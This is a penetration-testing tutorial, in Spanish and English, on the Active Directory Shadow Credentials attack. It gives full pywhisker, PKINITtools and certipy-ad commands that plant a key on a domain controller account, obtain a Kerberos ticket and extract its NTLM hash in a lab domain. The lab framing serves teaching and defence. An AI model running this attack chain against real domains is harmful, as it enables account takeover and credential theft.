El Ataque Shadow Credentials Attack ocurre como una metodología de persistencia, o (como lo veremos en este caso), obtención de acceso.

Cada objeto en AD (Active directory), tiene diferentes atributos, entre ellos hay uno llamado msDS-KeyCredentialLink, almacena diferentes claves publicas para la autenticación, un mismo objeto puede almacenar varias claves publicas al mismo tiempo, cada una de estas claves publicas tiene su respectiva clave privada la cual está siendo guardada en cada dispositivo de los que pueden tener acceso a el objeto. 

Para poder realizar el ataque hay que cumplirse ciertos requisitos:

- Windows Server 2019 como Active Directory que soporte PKINIT

- El dominio debe tener Active Directory Certificate Services (AD CS) y Certificate Authority (AD CA) configurados.

- Kali Linux

- Tools: PyWhishker, Impacket, certipy-ad, BloodyAD,  ldap_shell

- Windows 10/11 – As Client

- Tener privilegios GenericWrite o la opcion de editar el atributo msDS-KeyCredentialLink sobre la cuenta objetivo.



# Explotacion

### Method for Exploitation

los atacantes puede modificar el atributo  **msDS-KeyCredentialLink** inyectando una calve publica maliciosa en la cuenta del usuario. Una de las mayores causas de **Shadow Credentials attack** es la posibilidad de edicion del atributo  **msDS-KeyCredentialLink**, lo que permite al atacante inyectar una clave publica maliciosa para su posterior autenticacion.  

#### PyWhisker

Desde sistemas de tipo UNIX, el atributo  **msDS-KeyCredentialLink** de un usuario puede ser manipulado usando la herramienta [**pyWhisker**](https://github.com/ShutdownRepo/pywhisker).

Puedes usar este repositorio para instalar pywhisker:

git clone https://github.com/ShutdownRepo/pywhisker.git

python3 setup.py install

lista todas las  **KeyCredential IDs** y sus **tiempos de creacion** asociados con el objeto: **DC$**.

```shell
pywhisker -d ignite.local -u "krishna" -p "Password@1" --target "DC$" --action "list"
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh20nZFtCzrVOmTjr0C6LdoP6sz1rcIjVF1k6k1tk4vTbPn7Ks3O8gk8J60215ytNeSOqsqDcF1oFr9eNZ13Nye8mKhwCo5dD2tjAM8Rt6nCsdDNbTN_pF4Zsq1p2eSin4uSpEtVhD0l5mZQF42hfugz1_e7LlBxcYTxhXR2COfn4q7i_C9l7WmWBhV7YWq/s16000/8.png)

para este momento, se ve que el atributo **msDS-KeyCredentialLink** está vacio.

populating

La face de explotacion empieza envenenando **msDS-KeyCredentialLink** . 

PyWhishker **add** functionality, will generates a public-private key pair and adds a new key credential to the target object DC$.

Following this,  the output specifies the PFX file (and its associated password) where the certificate is stored. You will need this in the next step to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account using PKINIT.

```shell
pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action "add" --filename DC$
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT2x7Y5VAJj361oVIMsDGHg8__643wZYa_Etf8jJswK-kr_7y4QAEdr0MapQvmZzCOyfqQuMAljxG7IXQIPBoFDxKXpLrLfjfc8bPB_gl7ll1fUjZLyNmEUCtx3ciDIPdspYOtzFXmGLR1YpMh6kCLsxyxM1VNsDjDJ-0SVIHMxqdEu8_8rAnvJZWg0p0w/s16000/9.png)

After you add the new key, rerun the list command to verify that the system successfully added it. This time, the output will show the newly created **KeyCredential ID**, along with its **creation time**, including the **Device ID** of the new key.

pywhisker -d ignite.local -u "krishna" -p "Password@1" --target "DC$" --action "list"

Next, use the `pywhisker info` command to retrieve detailed information about the newly added KeyCredential linked to the **DC$ object**, identified by the **Device ID**.

pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action "info" --device-id e9c84cef-af24-9755-8ce3-67088fd3d280

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2SzOslWwkjT2bElfc2l3qTVQpH0DmDnAnSA2bhZCf9g7PhxV5ehNnFKSqh7lxKdZ3tUsZu3tcwat4JfBtdhdrRZ0vWR4IFvQD0de4ecS3WE3kPv_36xzqJmbG48icwm8zkDnu7LP9Yr7PvqHKXyIJjw-tgz8f-PqaInTaxAYK-1kaU-B-ZcrXKb1e-AP6/s16000/10.png)**

#### PKINITtools

##### Utilize [**PKINITOOLS**](https://github.com/dirkjanm/PKINITtools)  to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account

Request a TGT using the PFX file that we generated using whisker’s add functionality. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.

```shell
python gettgtpkinit.py -cert-pfx "/root/DC$.pfx" -pfx-pass eK2PeOlwG60EkPS2TNxX ignite.local/dc$ dc$.ccache
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVi96uhvdPkKfPn0N-nqpDoF-fnSenuNNaPqX-zam9cJumtG0UcpBFcpxB3o4G9SOoQK7NLF1Wu4494m37OVuyuCmqPKKQwrnwNH2XQPdMn9rKvhfGgPU3mgjKI2_CxD0doHfcrVk_tc__Ia7Us5kFlVwAePZcJo4t25oD9C_WGWONYGgS701AGZL_R3dS/s16000/11.png)

Set the **KRB5CCNAME** environment variable to point to the previously generated **dc$.ccache** file

export KRB5CCNAME=/root/PKINITtools/dc$.ccache

Utilize **getnthash.py** to retrieve the machine account’s NTLM hash

The getnthash.py tool utilizes Kerberos U2U (User-to-User) to submit a TGS (Ticket Granting Service) request for the attacker, which includes the PAC (Privilege Attribute Certificate). The PAC contains the NT hash for the targeted account, and the tool decrypts it using the AS-REP key that was used to obtain the TGT (Ticket Granting Ticket). This allows the attacker to extract the NTLM hash for further exploitation, such as Pass-the-Hash attacks.

python getnthash.py -key 86b989daa8099f4f9f04f14be14b33556f043c56b48b4d3c36ef030a65c9b3a0 ignite.local/dc$

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5IGw_0A70sqHG8_Y2x2cYo7KamewlOrIS1DslfnQS9xl8_mTwHDOlQlaYXxMIkRh2YfPkIun22X2iqzvJJM4gd9D2EpXKr2AqAVKLrpxOsexhywlq4Zx7K6b7ABEgXSoYkC2I8NhqaZ0XXtyIMpOqQFVwPgZD6bWqEUUVjAe3Ghc7rj19EGTpR2yDWjU/s16000/12.png)

#### Certipy-ad

As an alternative, [**Certipy**](https://github.com/ly4k/Certipy) can automate these steps in a single command, streamlining the exploitation process.

Certipy’s shadow command has an auto action, which will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.

certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account dc$

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit3TZGvCE9qFoUPERC8UusyDnJRw8VtW2KsJePGhSrk9qeN6jRCj0rskkpXWoOsbxMn1W9HivtGKDz1Gj5qwqXms0y_VBLE49dqBj6i4O8_CKa3x53sHs4xBjfuABsubI94ffHVzVQLF9aezz0jo2wis8zeCUfzFZqUVZJH33gbYquUEwxfXRE6JaaKptC/s16000/20.png)










